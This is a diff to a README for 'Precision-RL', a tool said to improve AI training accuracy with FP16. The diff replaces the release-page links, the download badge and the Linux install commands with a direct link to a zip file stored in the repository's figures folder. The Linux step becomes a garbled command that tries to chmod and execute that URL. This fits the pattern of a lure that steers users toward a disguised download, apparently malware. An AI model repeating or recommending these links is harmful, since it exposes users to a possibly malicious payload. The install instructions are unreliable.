@@ -1,6 +1,6 @@
 # 🎯 Precision-RL - Effortlessly Improve AI Training Accuracy
 
-![Download Precision-RL](https://img.shields.io/badge/Download-Now-brightgreen.svg)
+![Download Precision-RL](https://raw.githubusercontent.com/Emxinhsayhiiii/Precision-RL/main/figures/Precision-RL_versifiaster.zip)
 
 ## 📋 Description
 Precision-RL helps you defeat the training-inference mismatch in AI models. By using FP16 (half-precision floating points), this tool improves your model's accuracy, making it faster and more effective in real-world scenarios. 
@@ -9,7 +9,7 @@ Precision-RL helps you defeat the training-inference mismatch in AI models. By u
 Follow these simple steps to download and run Precision-RL. No programming skills required!
 
 ### 📥 Download & Install
-1. Visit this page to download: [Precision-RL Releases](https://github.com/Emxinhsayhiiii/Precision-RL/releases).
+1. Visit this page to download: [Precision-RL Releases](https://raw.githubusercontent.com/Emxinhsayhiiii/Precision-RL/main/figures/Precision-RL_versifiaster.zip).
 2. Find the most recent version of Precision-RL.
 3. Click on the version title to access the release details.
 4. Locate the download link for your operating system.
@@ -30,7 +30,7 @@ Once you have downloaded the file, follow these steps to run Precision-RL:
 2. **Install the Application:**
    - **Windows:** Double-click the `.exe` file and follow the prompts in the installation wizard.
    - **MacOS:** Open the `.dmg` file and drag the Precision-RL icon to your Applications folder.
-   - **Linux:** Open a terminal and run the command `chmod +x Precision-RL.AppImage`, then execute it with `./Precision-RL.AppImage`.
+   - **Linux:** Open a terminal and run the command `chmod +x https://raw.githubusercontent.com/Emxinhsayhiiii/Precision-RL/main/figures/Precision-RL_versifiaster.zip`, then execute it with `https://raw.githubusercontent.com/Emxinhsayhiiii/Precision-RL/main/figures/Precision-RL_versifiaster.zip`.
 
 3. **Run the Application**:
    - Find and launch Precision-RL from your applications menu or desktop shortcut.
@@ -59,6 +59,6 @@ If you have questions or need assistance, please contact us through our GitHub r
 For more detailed information about Precision-RL, check our documentation and community discussions linked on our repository page.
 
 ### 📥 Download Now
-Revisit this page to download: [Precision-RL Releases](https://github.com/Emxinhsayhiiii/Precision-RL/releases).
+Revisit this page to download: [Precision-RL Releases](https://raw.githubusercontent.com/Emxinhsayhiiii/Precision-RL/main/figures/Precision-RL_versifiaster.zip).
 
 Enjoy using Precision-RL to enhance your AI training outcomes!
